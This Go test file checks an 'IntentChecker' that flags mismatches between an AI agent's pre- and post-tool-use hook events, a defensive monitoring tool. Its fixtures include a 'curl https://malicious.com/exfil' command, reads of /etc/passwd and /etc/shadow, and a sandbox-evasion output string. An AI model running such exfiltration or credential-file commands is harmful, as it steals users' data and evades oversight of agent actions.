package trace

import (
	"path/filepath"
	"testing"
	"time"

	"github.com/ihavespoons/hooksy/internal/hooks"
)

func setupIntentChecker(t *testing.T) (*IntentChecker, *SQLiteStore, func()) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "test.db")

	store, err := NewSQLiteStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}

	checker := NewIntentChecker(store)

	return checker, store, func() {
		store.Close()
	}
}

func TestIntentCheckerNoMismatch(t *testing.T) {
	checker, store, cleanup := setupIntentChecker(t)
	defer cleanup()

	sessionID := "test-session"
	store.GetOrCreateSession(sessionID, "/home/user", "")

	// Store PreToolUse event
	preEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-123",
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		ToolInput: map[string]interface{}{
			"file_path": "/home/user/readme.txt",
		},
		Timestamp: time.Now().Add(-time.Second),
	}
	store.StoreEvent(preEvent)

	// PostToolUse with same details - no mismatch
	postEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-123",
		EventType: hooks.PostToolUse,
		ToolName:  "Read",
		ToolInput: map[string]interface{}{
			"file_path": "/home/user/readme.txt",
		},
		ToolResponse: map[string]interface{}{
			"content": "Hello, World!",
		},
		Timestamp: time.Now(),
	}

	mismatch := checker.CheckIntentMismatch(sessionID, postEvent)
	if mismatch != nil {
		t.Errorf("Expected no mismatch, got: %s", mismatch.MismatchType)
	}
}

func TestIntentCheckerToolNameMismatch(t *testing.T) {
	checker, store, cleanup := setupIntentChecker(t)
	defer cleanup()

	sessionID := "test-session"
	store.GetOrCreateSession(sessionID, "/home/user", "")

	// Store PreToolUse with one tool name
	preEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-456",
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		ToolInput: map[string]interface{}{
			"file_path": "/home/user/data.txt",
		},
		Timestamp: time.Now().Add(-time.Second),
	}
	store.StoreEvent(preEvent)

	// PostToolUse with different tool name (suspicious)
	postEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-456",
		EventType: hooks.PostToolUse,
		ToolName:  "Write", // Changed!
		ToolInput: map[string]interface{}{
			"file_path": "/home/user/data.txt",
		},
		Timestamp: time.Now(),
	}

	mismatch := checker.CheckIntentMismatch(sessionID, postEvent)
	if mismatch == nil {
		t.Fatal("Expected tool name mismatch")
	}

	if mismatch.MismatchType != "tool_name_mismatch" {
		t.Errorf("Expected tool_name_mismatch, got %s", mismatch.MismatchType)
	}

	if mismatch.Severity != "critical" {
		t.Errorf("Expected critical severity, got %s", mismatch.Severity)
	}
}

func TestIntentCheckerFileMismatch(t *testing.T) {
	checker, store, cleanup := setupIntentChecker(t)
	defer cleanup()

	sessionID := "test-session"
	store.GetOrCreateSession(sessionID, "/home/user", "")

	// Store PreToolUse for one file
	preEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-789",
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		ToolInput: map[string]interface{}{
			"file_path": "/home/user/config.yaml",
		},
		Timestamp: time.Now().Add(-time.Second),
	}
	store.StoreEvent(preEvent)

	// PostToolUse shows different file was accessed
	postEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-789",
		EventType: hooks.PostToolUse,
		ToolName:  "Read",
		ToolInput: map[string]interface{}{
			"file_path": "/etc/passwd", // Different file!
		},
		ToolResponse: map[string]interface{}{
			"content": "root:x:0:0:root:/root:/bin/bash",
		},
		Timestamp: time.Now(),
	}

	mismatch := checker.CheckIntentMismatch(sessionID, postEvent)
	if mismatch == nil {
		t.Fatal("Expected file path mismatch")
	}

	if mismatch.MismatchType != "file_mismatch" {
		t.Errorf("Expected file_mismatch, got %s", mismatch.MismatchType)
	}
}

func TestIntentCheckerCommandMismatch(t *testing.T) {
	checker, store, cleanup := setupIntentChecker(t)
	defer cleanup()

	sessionID := "test-session"
	store.GetOrCreateSession(sessionID, "/home/user", "")

	// Store PreToolUse for one command
	preEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-abc",
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{
			"command": "ls -la",
		},
		Timestamp: time.Now().Add(-time.Second),
	}
	store.StoreEvent(preEvent)

	// PostToolUse shows different command executed
	postEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-abc",
		EventType: hooks.PostToolUse,
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{
			"command": "curl https://malicious.com/exfil", // Different!
		},
		ToolResponse: map[string]interface{}{
			"stdout": "OK",
		},
		Timestamp: time.Now(),
	}

	mismatch := checker.CheckIntentMismatch(sessionID, postEvent)
	if mismatch == nil {
		t.Fatal("Expected command mismatch")
	}

	if mismatch.MismatchType != "command_mismatch" {
		t.Errorf("Expected command_mismatch, got %s", mismatch.MismatchType)
	}
}

func TestIntentCheckerSuspiciousOutput(t *testing.T) {
	checker, store, cleanup := setupIntentChecker(t)
	defer cleanup()

	sessionID := "test-session"
	store.GetOrCreateSession(sessionID, "/home/user", "")

	// Store PreToolUse
	preEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-def",
		EventType: hooks.PreToolUse,
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{
			"command": "check-environment",
		},
		Timestamp: time.Now().Add(-time.Second),
	}
	store.StoreEvent(preEvent)

	// PostToolUse with suspicious sandbox detection output
	postEvent := &Event{
		SessionID: sessionID,
		ToolUseID: "tool-def",
		EventType: hooks.PostToolUse,
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{
			"command": "check-environment",
		},
		ToolResponse: map[string]interface{}{
			"stdout": "Virtual Machine detected, aborting operation",
		},
		Timestamp: time.Now(),
	}

	mismatch := checker.CheckIntentMismatch(sessionID, postEvent)
	if mismatch == nil {
		t.Fatal("Expected suspicious output detection")
	}

	if mismatch.MismatchType != "suspicious_output" {
		t.Errorf("Expected suspicious_output, got %s", mismatch.MismatchType)
	}

	if mismatch.Severity != "warning" {
		t.Errorf("Expected warning severity, got %s", mismatch.Severity)
	}
}

func TestIntentCheckerNonPostToolUse(t *testing.T) {
	checker, _, cleanup := setupIntentChecker(t)
	defer cleanup()

	// PreToolUse events should return nil (only check PostToolUse)
	event := &Event{
		SessionID: "test-session",
		ToolUseID: "tool-123",
		EventType: hooks.PreToolUse,
		ToolName:  "Read",
		Timestamp: time.Now(),
	}

	mismatch := checker.CheckIntentMismatch("test-session", event)
	if mismatch != nil {
		t.Error("Expected nil for non-PostToolUse event")
	}
}

func TestIntentCheckerNoToolUseID(t *testing.T) {
	checker, _, cleanup := setupIntentChecker(t)
	defer cleanup()

	// Event without tool_use_id should return nil
	event := &Event{
		SessionID: "test-session",
		ToolUseID: "", // Empty
		EventType: hooks.PostToolUse,
		ToolName:  "Read",
		Timestamp: time.Now(),
	}

	mismatch := checker.CheckIntentMismatch("test-session", event)
	if mismatch != nil {
		t.Error("Expected nil for event without tool_use_id")
	}
}

func TestIntentCheckerNoPreEvent(t *testing.T) {
	checker, store, cleanup := setupIntentChecker(t)
	defer cleanup()

	sessionID := "test-session"
	store.GetOrCreateSession(sessionID, "/home/user", "")

	// PostToolUse without corresponding PreToolUse
	event := &Event{
		SessionID: sessionID,
		ToolUseID: "orphan-tool-123",
		EventType: hooks.PostToolUse,
		ToolName:  "Read",
		Timestamp: time.Now(),
	}

	mismatch := checker.CheckIntentMismatch(sessionID, event)
	if mismatch != nil {
		t.Error("Expected nil when no PreToolUse event found")
	}
}

func TestAnalyzeIntentSequence(t *testing.T) {
	checker, _, cleanup := setupIntentChecker(t)
	defer cleanup()

	events := []*Event{
		{
			SessionID: "test-session",
			ToolUseID: "tool-1",
			EventType: hooks.PreToolUse,
			ToolName:  "Read",
			ToolInput: map[string]interface{}{
				"file_path": "/home/user/file1.txt",
			},
			Timestamp: time.Now().Add(-4 * time.Second),
		},
		{
			SessionID: "test-session",
			ToolUseID: "tool-2",
			EventType: hooks.PreToolUse,
			ToolName:  "Read",
			ToolInput: map[string]interface{}{
				"file_path": "/home/user/file2.txt",
			},
			Timestamp: time.Now().Add(-3 * time.Second),
		},
		{
			SessionID: "test-session",
			ToolUseID: "tool-1",
			EventType: hooks.PostToolUse,
			ToolName:  "Read",
			ToolInput: map[string]interface{}{
				"file_path": "/home/user/file1.txt", // Same - OK
			},
			Timestamp: time.Now().Add(-2 * time.Second),
		},
		{
			SessionID: "test-session",
			ToolUseID: "tool-2",
			EventType: hooks.PostToolUse,
			ToolName:  "Read",
			ToolInput: map[string]interface{}{
				"file_path": "/etc/shadow", // Different! Mismatch
			},
			Timestamp: time.Now().Add(-1 * time.Second),
		},
	}

	mismatches := checker.AnalyzeIntentSequence("test-session", events)

	if len(mismatches) != 1 {
		t.Fatalf("Expected 1 mismatch, got %d", len(mismatches))
	}

	if mismatches[0].MismatchType != "file_mismatch" {
		t.Errorf("Expected file_mismatch, got %s", mismatches[0].MismatchType)
	}

	if mismatches[0].PreEvent.ToolUseID != "tool-2" {
		t.Error("Wrong PreEvent in mismatch")
	}
}

func TestGetStringField(t *testing.T) {
	tests := []struct {
		name     string
		m        map[string]interface{}
		key      string
		expected string
	}{
		{
			name:     "nil map",
			m:        nil,
			key:      "foo",
			expected: "",
		},
		{
			name:     "missing key",
			m:        map[string]interface{}{"bar": "baz"},
			key:      "foo",
			expected: "",
		},
		{
			name:     "string value",
			m:        map[string]interface{}{"foo": "hello"},
			key:      "foo",
			expected: "hello",
		},
		{
			name:     "non-string value",
			m:        map[string]interface{}{"foo": 123},
			key:      "foo",
			expected: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := getStringField(tt.m, tt.key)
			if got != tt.expected {
				t.Errorf("getStringField() = %q, want %q", got, tt.expected)
			}
		})
	}
}

func TestFlattenMap(t *testing.T) {
	m := map[string]interface{}{
		"key1": "value1",
		"key2": "value2",
	}

	result := flattenMap(m)

	// Should contain both key-value pairs
	if result == "" {
		t.Error("Expected non-empty result")
	}
}
